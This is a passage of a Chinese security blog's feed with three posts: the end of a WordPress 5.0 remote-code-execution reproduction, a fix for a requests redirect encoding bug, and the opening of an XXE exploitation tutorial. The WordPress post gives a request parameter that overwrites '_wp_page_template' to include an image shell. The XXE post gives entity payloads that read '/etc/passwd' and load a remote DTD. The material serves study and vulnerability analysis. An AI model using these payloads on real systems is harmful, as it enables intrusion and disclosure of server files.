class="line">action=crop-image&amp;_ajax_nonce=e6c1b51c5b&amp;id=22&amp;cropDetails[x1]=10&amp;cropDetails[y1]=10&amp;cropDetails[width]=500&amp;cropDetails[height]=750&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100</span><br></pre></td></tr></table></figure><p><img src="../images/wordpress5.0-rce/18.png" alt=""></p><p><img src="../images/wordpress5.0-rce/17.png" alt=""></p><p>查看下文件exif信息，恶意代码还保留着</p><p><img src="../images/wordpress5.0-rce/19.png" alt=""></p></li><li><p><strong>step4</strong> 覆盖<code>_wp_page_template</code>变量</p><ul><li><p>再上传一个txt文件，和前面上传图片一样</p></li><li><p>修改文件信息并抓包改包</p><p>数据包中添加（图片为刚裁剪后的图片）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;meta_input[_wp_page_template]=cropped-shell-e1551529756623.jpg</span><br></pre></td></tr></table></figure><p><img src="../images/wordpress5.0-rce/20.png" alt=""></p><p>查看数据库,<code>_wp_page_template</code>被覆盖为了我们指定的值</p><p><img src="../images/wordpress5.0-rce/21.png" alt=""></p></li></ul></li><li><p><strong>step5</strong> 包含图片马</p><p>查看text.txt的附件信息，图片马被包含</p><p><img src="../images/wordpress5.0-rce/22.png" alt=""></p><p><img src="../images/wordpress5.0-rce/23.png" alt=""></p></li></ul><p>​   </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="wp-attached-file变量覆盖"><a href="#wp-attached-file变量覆盖" class="headerlink" title="_wp_attached_file变量覆盖"></a><code>_wp_attached_file</code>变量覆盖</h4><p>进入编辑</p><p><img src="../images/wordpress5.0-rce/24.png" alt=""></p><p>进入更新post data</p><p><img src="../images/wordpress5.0-rce/25.png" alt=""></p><p>进入wp_insert_attachment</p><p><img src="../images/wordpress5.0-rce/26.png" alt=""></p><p>进入wp_insert_post</p><p><img src="../images/wordpress5.0-rce/27.png" alt=""></p><p>最后到更新<code>_wp_attached_file</code>这里，可以看到我们自己传递的数据经过一系列复杂的操作及过滤依然没有变</p><p><img src="../images/wordpress5.0-rce/28.png" alt=""></p><h4 id="裁剪图片，将裁剪后的图片写到任意目录下"><a href="#裁剪图片，将裁剪后的图片写到任意目录下" class="headerlink" title="裁剪图片，将裁剪后的图片写到任意目录下"></a>裁剪图片，将裁剪后的图片写到任意目录下</h4><p>进入do_action处理，然后进入到wp_ajax_crop_image</p><p><img src="../images/wordpress5.0-rce/29.png" alt=""></p><p><img src="../images/wordpress5.0-rce/30.png" alt=""></p><p>进入wp_crop_image，可以看到取出了attachment_file，就是我们开始覆盖的值</p><p><img src="../images/wordpress5.0-rce/31.png" alt=""></p><p>创建上传文件夹，这里根据当前日期创建了2019/03文件夹</p><p><img src="../images/wordpress5.0-rce/32.png" alt=""></p><p>接着调用editor（这里是imagick）save方法将裁减的内容保存到dst_file，也就将裁剪后的图片马保存了我们设置的地方</p><p><img src="../images/wordpress5.0-rce/33.png" alt=""></p><h4 id="wp-page-template覆盖"><a href="#wp-page-template覆盖" class="headerlink" title="_wp_page_template覆盖"></a><code>_wp_page_template</code>覆盖</h4><p>这一步和<code>__wp_attached_file</code>覆盖一样，至于如何找到的要覆盖这个变量，应该需要熟悉wordpress和足够的审计经验。我这种小白是不知道大佬如何找的…</p><p><img src="../images/wordpress5.0-rce/34.png" alt=""></p><h4 id="包含裁剪图片马"><a href="#包含裁剪图片马" class="headerlink" title="包含裁剪图片马"></a>包含裁剪图片马</h4><p>根据网上的一些分析，函数<code>get_page_template</code>和<code>get_single_template</code>这两个在函数中调 用了<code>get_page_template_slug</code>函数，而<code>get_page_template_slug</code>又从数据库获取了<code>_wp_page_template</code>，</p><p>只需要找到调用了<code>get_page_template</code>或<code>get_single_template</code>的地方，模板就能被包含</p><p>在上面复现的步骤中，我们点击了查看附件，会进入</p><p><img src="../images/wordpress5.0-rce/35.png" alt=""></p><p>进入get_single_template，可以看到模板被复赋值为图片马</p><p><img src="../images/wordpress5.0-rce/36.png" alt=""></p><p>图片马被包含</p><p><img src="../images/wordpress5.0-rce/37.png" alt=""></p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><a href="http://pecl.php.net/package/imagick" target="_blank" rel="noopener">imagick-dll</a></li><li><a href="http://www.imagemagick.org" target="_blank" rel="noopener">imagemagick</a></li><li><a href="http://www.magicexif.com/" target="_blank" rel="noopener">magickexif</a></li><li><a href="https://paper.seebug.org/822/" target="_blank" rel="noopener">seebugpaper</a></li><li><a href="http://blog.nsfocus.net/wordpress-5-0-0-rce/" target="_blank" rel="noopener">nsfocusblog</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;当你觉得很累的时候，说明你正在走上坡路。&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;看了网上大佬们的分析，作为代码审计入门级别的我，看大佬分析都很吃力，很多地方看得稀里糊涂…所以决定动手跟踪下，看下到底怎么触发漏洞，也学习下大佬们的思路，积累些经验。参考了seebug paper &lt;a href=&quot;https://paper.seebug.org/822/&quot; title=&quot;seebugpaper&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;seebugpaper&lt;/a&gt;与绿盟的分析&lt;a href=&quot;http://blog.nsfocus.net/wordpress-5-0-0-rce/&quot; title=&quot;nsfocusblog&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;nsfocusblog&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://longofo.cc/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://longofo.cc/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="代码审计" scheme="http://longofo.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>requests redirect bug</title>
    <link href="http://longofo.cc/requests%20redirect%20bug.html"/>
    <id>http://longofo.cc/requests redirect bug.html</id>
    <published>2019-01-06T06:25:25.000Z</published>
    <updated>2019-01-06T07:00:13.405Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">得之坦然，失之淡然，顺其自然，争其必然</blockquote><blockquote><p>fix一个requests redirect bug</p></blockquote><a id="more"></a><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在我请求某个链接的时候，requests抛出了如下异常（我是python3环境）：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\IPython\core\interactiveshell.py"</span>, line <span class="number">2910</span>, <span class="keyword">in</span> run_code</span><br><span class="line">    exec(code_obj, self.user_global_ns, self.user_ns)</span><br><span class="line">  File <span class="string">"&lt;ipython-input-8-36f4e5f02f7e&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    resp = requests.get(<span class="string">'http://xxx.com/xxx'</span>)</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\requests\api.py"</span>, line <span class="number">72</span>, <span class="keyword">in</span> get</span><br><span class="line">    <span class="keyword">return</span> request(<span class="string">'get'</span>, url, params=params, **kwargs)</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\requests\api.py"</span>, line <span class="number">58</span>, <span class="keyword">in</span> request</span><br><span class="line">    <span class="keyword">return</span> session.request(method=method, url=url, **kwargs)</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\requests\sessions.py"</span>, line <span class="number">512</span>, <span class="keyword">in</span> request</span><br><span class="line">    resp = self.send(prep, **send_kwargs)</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\requests\sessions.py"</span>, line <span class="number">644</span>, <span class="keyword">in</span> send</span><br><span class="line">    history = [resp <span class="keyword">for</span> resp <span class="keyword">in</span> gen] <span class="keyword">if</span> allow_redirects <span class="keyword">else</span> []</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\requests\sessions.py"</span>, line <span class="number">644</span>, <span class="keyword">in</span> &lt;listcomp&gt;</span><br><span class="line">    history = [resp <span class="keyword">for</span> resp <span class="keyword">in</span> gen] <span class="keyword">if</span> allow_redirects <span class="keyword">else</span> []</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\requests\sessions.py"</span>, line <span class="number">124</span>, <span class="keyword">in</span> resolve_redirects</span><br><span class="line">    url = self.get_redirect_target(resp)</span><br><span class="line">    File <span class="string">"F:\python\python36\lib\site-packages\requests\sessions.py"</span>, line <span class="number">115</span>, <span class="keyword">in</span> get_redirect_target</span><br><span class="line">    <span class="keyword">return</span> to_native_string(location, <span class="string">'utf8'</span>)</span><br><span class="line">  File <span class="string">"F:\python\python36\lib\site-packages\requests\_internal_utils.py"</span>, line <span class="number">25</span>, <span class="keyword">in</span> to_native_string</span><br><span class="line">    out = string.decode(encoding)</span><br><span class="line">UnicodeDecodeError: <span class="string">'utf-8'</span> codec can<span class="string">'t decode byte 0xc7 in position 45: invalid continuation byte</span></span><br></pre></td></tr></table></figure></p><p>看错误信息应该是重定向了，并且requests无法正常解码location字段</p><p>通过抓包看请求，发现重定向链接含有非ascii字符:</p><p><img src="../images/requests-redirect-bug/1.png" alt=""></p><p>可以看到含有非ascii字符，且编码是gbk</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>根据上面报错信息，查看requests\sessions.py的get_redirect_target函数的解码部分和：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> resp.is_redirect:</span><br><span class="line">    location = resp.headers[<span class="string">'location'</span>]</span><br><span class="line">    <span class="comment"># Currently the underlying http module on py3 decode headers</span></span><br><span class="line">    <span class="comment"># in latin1, but empirical evidence suggests that latin1 is very</span></span><br><span class="line">    <span class="comment"># rarely used with non-ASCII characters in HTTP headers.</span></span><br><span class="line">    <span class="comment"># It is more likely to get UTF8 header rather than latin1.</span></span><br><span class="line">    <span class="comment"># This causes incorrect handling of UTF8 encoded location headers.</span></span><br><span class="line">    <span class="comment"># To solve this, we re-encode the location in latin1.</span></span><br><span class="line">    <span class="keyword">if</span> is_py3:</span><br><span class="line">        location = location.encode(<span class="string">'latin1'</span>)</span><br><span class="line">    <span class="keyword">return</span> to_native_string(location, <span class="string">'utf8'</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">None</span></span><br></pre></td></tr></table></figure><p>如果是python3，那么先使用latin1加密一次，接着调用了to_native_string，默认的就是’utf-8’，而最终的错误回溯也是在这里：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> isinstance(string, builtin_str):</span><br><span class="line">    out = string</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> is_py2:</span><br><span class="line">        out = string.encode(encoding)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        out = string.decode(encoding)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> out</span><br></pre></td></tr></table></figure><p>如果是python3，会解码，encoding就是’utf-8’。</p><p>但是我的重定向链接编码不是utf-8而是gbk，所以无法正常解码。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>我的解决办法是对session的get_redirect_target方法做了patch：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests._internal_utils <span class="keyword">import</span> to_native_string</span><br><span class="line"><span class="keyword">from</span> requests.compat <span class="keyword">import</span> is_py3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_redirect_target</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">    <span class="string">"""hook requests.Session.get_redirect_target method"""</span></span><br><span class="line">    <span class="keyword">if</span> resp.is_redirect:</span><br><span class="line">        location = resp.headers[<span class="string">'location'</span>]</span><br><span class="line">        <span class="keyword">if</span> is_py3:</span><br><span class="line">            location = location.encode(<span class="string">'latin1'</span>)</span><br><span class="line">        encoding = resp.encoding <span class="keyword">if</span> resp.encoding <span class="keyword">else</span> <span class="string">'utf-8'</span></span><br><span class="line">        <span class="keyword">return</span> to_native_string(location, encoding)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch</span><span class="params">()</span>:</span></span><br><span class="line">    requests.Session.get_redirect_target = get_redirect_target</span><br></pre></td></tr></table></figure><p>其他地方需要patch的，直接在使用requests请求之前调用patch方法就行了</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;得之坦然，失之淡然，顺其自然，争其必然&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;fix一个requests redirect bug&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>xxe漏洞利用总结</title>
    <link href="http://longofo.cc/xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93.html"/>
    <id>http://longofo.cc/xxe漏洞利用总结.html</id>
    <published>2018-11-07T08:46:44.000Z</published>
    <updated>2018-11-17T14:23:55.780Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">今天很残酷,明天也一样,后天也许还是一样,但你不得不经过明天后天</blockquote><blockquote><p>最近遇到了关于xxe相关漏洞，于是想做个总结，方便以后查阅。</p></blockquote><a id="more"></a><h2 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h2><h3 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h3><p>XML文档结构包括XML声明、DTD文档类型定义（可选,可选是因为类型定义是加强约束,对于漏洞利用来说可以不定义）、文档元素。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML申明--&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。</p><p>内部声明DTD:<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p><p>引用外部DTD:<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p><p>DTD文档中有很多重要的关键字如下:</p><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li></ul><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体 (General entities)</li><li>参数实体 (Parameter entities)<br>实体根据引用方式，还可分为内部实体与外部实体。<br>完整的实体类别可参考 <a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm" target="_blank" rel="noopener">DTD - Entities</a></li></ul><h4 id="实体类别"><a href="#实体类别" class="headerlink" title="实体类别"></a>实体类别</h4><p>内部实体：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>外部实体：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>参数实体：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>参数实体用<code>% 实体名称</code>申明，引用时也用<code>% 实体名称</code>;其余实体直接用<code>实体名</code>称申明，引用时用<code>&amp; 实体名称</code>。<br>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。</p><h2 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h2><p>内部实体：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY name "longofo"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>php测试：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">'&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">    &lt;!ENTITY name "longofo"&gt;]&gt;</span></span><br><span class="line"><span class="string">&lt;foo&gt;</span></span><br><span class="line"><span class="string">        &lt;value&gt;&amp;name;&lt;/value&gt; </span></span><br><span class="line"><span class="string">&lt;/foo&gt;'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//注意在php新版本中需要加SimpleXMLElement和LIBXML_NOENT才能复现成功。</span></span><br><span class="line">    $doc = simplexml_load_string($xml,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line">    var_dump($doc);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $doc-&gt;vaule;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/xxe漏洞利用总结1.png" alt="/images/xxe漏洞利用总结1.png"></p><p>外部实体：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY name SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>php测试：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">'&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">    &lt;!ENTITY name SYSTEM "file:///C:/Users/dell/Desktop/xxe.txt"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;foo&gt;</span></span><br><span class="line"><span class="string">    &lt;value&gt;&amp;name;&lt;/value&gt;</span></span><br><span class="line"><span class="string">&lt;/foo&gt;'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//注意在php新版本中需要加SimpleXMLElement和LIBXML_NOENT才能复现成功。</span></span><br><span class="line">    $doc = simplexml_load_string($xml,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line">    var_dump($doc);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $doc-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/xxe漏洞利用总结2.png" alt="/images/xxe漏洞利用总结2.png"></p><p>参数实体：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % file SYSTEM "http://127.0.0.1:8088/Desktop/xxe.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">vaule</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>xxe.dtd内容：<br><img src="/images/xxe漏洞利用总结3.png" alt="/images/xxe漏洞利用总结3.png"><br>为了进行测试可以简单使用python启动一个服务器：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">8088</span></span><br></pre></td></tr></table></figure></p><p>php测试：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">'&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">    &lt;!ENTITY % file SYSTEM "http://10.1.8.35:8088/Desktop/xxe.dtd"&gt;</span></span><br><span class="line"><span class="string">    %file;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;foo&gt;</span></span><br><span class="line"><span class="string">    &lt;value&gt;&amp;name;&lt;/value&gt;</span></span><br><span class="line"><span class="string">&lt;/foo&gt;'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//注意在php新版本中需要加SimpleXMLElement和LIBXML_NOENT才能复现成功。</span></span><br><span class="line">    $doc = simplexml_load_string($xml,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line">    var_dump($doc);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $doc-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/xxe漏洞利用总结4.png" alt="/images/xxe漏洞利用总结4.png"></p><p><em>注意</em>：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。</p><p>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。</p><h2 id="外部实体支持的协议类型"><a 